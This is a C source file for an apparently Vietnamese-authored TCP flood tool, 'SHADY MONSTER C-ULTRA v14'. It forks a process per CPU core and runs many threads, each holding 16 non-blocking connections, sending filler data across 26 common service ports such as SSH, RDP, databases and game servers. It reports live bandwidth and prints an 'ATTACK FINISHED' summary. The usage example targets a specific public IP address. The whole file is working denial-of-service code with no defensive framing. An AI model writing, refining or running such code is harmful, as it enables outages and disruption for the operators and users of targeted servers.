/*
 * SHADY MONSTER C-ULTRA v14 — BALANCED MULTI-CONNECTION
 * Quay lại v9 với cấu hình cân bằng, không complexity.
 * Mục tiêu: ổn định hơn v12, mạnh hơn v9.
 * Compile: gcc -O3 -pthread -o attack attack.c
 * Usage:   ./attack <IP> <PORT> <TIME> [THREADS]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>

#define GRN "\033[1;32m"
#define CYN "\033[1;36m"
#define YLW "\033[1;33m"
#define RED "\033[1;31m"
#define WHT "\033[1;37m"
#define RST "\033[0m"
#define CLR "\033[2K\r"
#define CONNS_PER_THREAD 16

static int g_ports[] = {22,80,443,8080,8443,53,3306,5432,6379,27017,3389,21,25,110,143,993,995,25565,19132,27015,3074,5060,11211,9200,9090,3478};
static int g_nports = 26;

struct stats {
    volatile unsigned long long ok;
    volatile unsigned long long fail;
    volatile unsigned long long bytes;
    volatile int running;
};
static struct stats *S;
static char  g_ip[64];
static int   g_port, g_dur, g_threads_total, g_num_cores, g_th_per_proc;

static double now(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void fmt_bw(double mbps, char *o, size_t n) {
    if (mbps >= 1000.0) snprintf(o, n, "%.2f Gbps", mbps / 1000.0);
    else snprintf(o, n, "%.2f Mbps", mbps);
}
static void fmt_pps(unsigned long long p, char *o, size_t n) {
    if (p >= 1000000) snprintf(o, n, "%.2f Mpps", p / 1000000.0);
    else if (p >= 1000) snprintf(o, n, "%.2f Kpps", p / 1000.0);
    else snprintf(o, n, "%llu pps", p);
}

/* ──── BALANCED MULTI-CONNECTION WORKER ──── */
static void *multi_conn_worker(void *arg) {
    int port = *(int *)arg;
    char buf[256];
    memset(buf, 'X', sizeof(buf));

    struct pollfd pfd[CONNS_PER_THREAD];
    int fds[CONNS_PER_THREAD];
    int active = 0;

    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        fds[i] = -1;
        pfd[i].fd = -1;
    }

    while (S->running) {
        /* Try to establish new connections if we have room */
        for (int i = 0; i < CONNS_PER_THREAD && active < CONNS_PER_THREAD; i++) {
            if (fds[i] >= 0) continue;

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;

            int yes = 1;
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));
            fcntl(fd, F_SETFL, O_NONBLOCK);

            struct sockaddr_in a;
            memset(&a, 0, sizeof(a));
            a.sin_family = AF_INET;
            a.sin_port   = htons(port);
            inet_pton(AF_INET, g_ip, &a.sin_addr);

            int ret = connect(fd, (struct sockaddr *)&a, sizeof(a));
            if (ret == 0) {
                fds[i] = fd;
                pfd[i].fd = fd;
                pfd[i].events = POLLOUT;
                active++;
                __sync_fetch_and_add(&S->ok, 1);
            } else if (errno == EINPROGRESS) {
                fds[i] = fd;
                pfd[i].fd = fd;
                pfd[i].events = POLLOUT;
                active++;
            } else {
                __sync_fetch_and_add(&S->fail, 1);
                close(fd);
            }
        }

        /* Poll for writability and send data */
        int ret = poll(pfd, CONNS_PER_THREAD, 100); /* 50ms timeout */
        if (ret > 0) {
            for (int i = 0; i < CONNS_PER_THREAD; i++) {
                if (fds[i] < 0) continue;

                if (pfd[i].revents & POLLOUT) {
                    int err = 0;
                    socklen_t len = sizeof(err);
                    getsockopt(fds[i], SOL_SOCKET, SO_ERROR, &err, &len);
                    if (err == 0) {
                        ssize_t n = send(fds[i], buf, sizeof(buf), MSG_NOSIGNAL);
                        if (n > 0) __sync_fetch_and_add(&S->bytes, n);
                        else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            close(fds[i]);
                            fds[i] = -1;
                            pfd[i].fd = -1;
                            active--;
                        }
                    } else {
                        close(fds[i]);
                        fds[i] = -1;
                        pfd[i].fd = -1;
                        active--;
                        __sync_fetch_and_add(&S->fail, 1);
                    }
                } else if (pfd[i].revents & (POLLERR | POLLHUP)) {
                    close(fds[i]);
                    fds[i] = -1;
                    pfd[i].fd = -1;
                    active--;
                }
            }
        }
    }

    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
    return NULL;
}

/* ──── CHILD ──── */
static void child(int core_id) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(core_id % g_num_cores, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    pthread_t *tids = calloc(g_th_per_proc, sizeof(pthread_t));
    int *ports = calloc(g_th_per_proc, sizeof(int));
    if (!tids || !ports) _exit(1);

    for (int i = 0; i < g_th_per_proc; i++) {
        ports[i] = g_ports[i % g_nports];
        pthread_create(&tids[i], NULL, multi_conn_worker, &ports[i]);
    }
    for (int i = 0; i < g_th_per_proc; i++) pthread_join(tids[i], NULL);
    free(ports); free(tids);
    _exit(0);
}

/* ──── MONITOR ──── */
static void monitor(void) {
    double t0 = now(), lt = t0;
    unsigned long long lok = 0, lfail = 0, lb = 0;

    printf("\n");
    while (S->running) {
        usleep(500000);
        double nw = now(), dt = nw - lt;
        if (dt <= 0) continue;

        unsigned long long ok = S->ok, fail = S->fail, byt = S->bytes;
        unsigned long long dp = (ok - lok) + (fail - lfail);
        unsigned long long db = byt - lb;
        unsigned long long pps = (unsigned long long)(dp / dt);
        double mbps = (db * 8.0) / (dt * 1e6);

        char ps[32], bs[32];
        fmt_pps(pps, ps, sizeof(ps)); fmt_bw(mbps, bs, sizeof(bs));

        double el = nw - t0;
        int pct = (int)(el / g_dur * 100); if (pct > 100) pct = 100;
        int bw = 30, fl = bw * pct / 100;
        char bar[64];
        for (int i = 0; i < bw; i++) bar[i] = (i < fl) ? '#' : '-';
        bar[bw] = '\0';

        printf(CLR GRN "║ " WHT "%s:%d" GRN " │ %3d%% [%s] │ "
               GRN "BW: %s" CYN " │ " GRN "PPS: %s" GRN " │ ✅%llu ❌%llu ║" RST,
               g_ip, g_port, pct, bar, bs, ps, ok, fail);
        fflush(stdout);

        lok = ok; lfail = fail; lb = byt; lt = nw;
        if (el >= g_dur) S->running = 0;
    }

    double dur = now() - t0; if (dur <= 0) dur = 1;
    unsigned long long tp = S->ok + S->fail;
    double ap = tp / dur, am = (S->bytes * 8.0) / (dur * 1e6);
    char ps[32], bs[32];
    fmt_pps((unsigned long long)ap, ps, sizeof(ps)); fmt_bw(am, bs, sizeof(bs));

    printf("\n\n" GRN "  ╔══════════════════════════════════════════╗" RST "\n");
    printf(GRN "  ║        ATTACK FINISHED — SUMMARY         ║" RST "\n");
    printf(GRN "  ╠══════════════════════════════════════════╣" RST "\n");
    printf(GRN "  ║  TCP OK:   %-22llu ║" RST "\n", S->ok);
    printf(GRN "  ║  TCP FAIL: %-22llu ║" RST "\n", S->fail);
    printf(GRN "  ║  Bytes:    %-22llu ║" RST "\n", S->bytes);
    printf(GRN "  ║  PPS:      %-22s ║" RST "\n", ps);
    printf(GRN "  ║  BW:       %-22s ║" RST "\n", bs);
    printf(GRN "  ╚══════════════════════════════════════════╝" RST "\n\n");
}

static void sig(int s) { (void)s; if (S) S->running = 0; }

int main(int argc, char *argv[]) {
    printf("\n" CYN "  ╔══════════════════════════════════════════════╗" RST "\n");
    printf(CYN "  ║   SHADY MONSTER C-ULTRA v14 — BALANCED      ║" RST "\n");
    printf(CYN "  ╚══════════════════════════════════════════════╝" RST "\n\n");

    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        printf("Example: %s 52.221.250.215 3389 120 4096\n\n", argv[0]);
        return 1;
    }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]); g_dur = atoi(argv[3]);
    g_threads_total = (argc >= 5) ? atoi(argv[4]) : 0;
    if (g_dur < 1) g_dur = 30;

    g_num_cores = get_nprocs(); if (g_num_cores < 1) g_num_cores = 1;
    if (g_threads_total <= 0) g_threads_total = g_num_cores * 512;
    g_th_per_proc = g_threads_total / g_num_cores;
    if (g_th_per_proc < 16) g_th_per_proc = 16;

    printf("  Target:    %s:%d\n", g_ip, g_port);
    printf("  Duration:  %ds\n", g_dur);
    printf("  Cores:     %d\n", g_num_cores);
    printf("  Threads:   %d (%d/proc)\n", g_threads_total, g_th_per_proc);
    printf("  Carpet:    %d ports\n", g_nports);
    printf("  Conns:     %d/thread (total ~%llu)\n", CONNS_PER_THREAD, (unsigned long long)g_threads_total * CONNS_PER_THREAD);
    printf("  Mode:      Balanced multi-conn (poll 50ms)\n\n");

    S = mmap(NULL, sizeof(struct stats), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (S == MAP_FAILED) { perror("mmap"); return 1; }
    memset(S, 0, sizeof(struct stats)); S->running = 1;
    signal(SIGINT, sig); signal(SIGTERM, sig);

    pid_t *pids = calloc(g_num_cores, sizeof(pid_t));
    for (int i = 0; i < g_num_cores; i++) {
        pid_t p = fork();
        if (p == 0) child(i);
        else if (p > 0) pids[i] = p;
        else { S->running = 0; break; }
    }
    monitor();
    for (int i = 0; i < g_num_cores; i++)
        if (pids[i] > 0) { kill(pids[i], SIGKILL); waitpid(pids[i], NULL, 0); }
    free(pids); munmap(S, sizeof(struct stats));
    return 0;
}
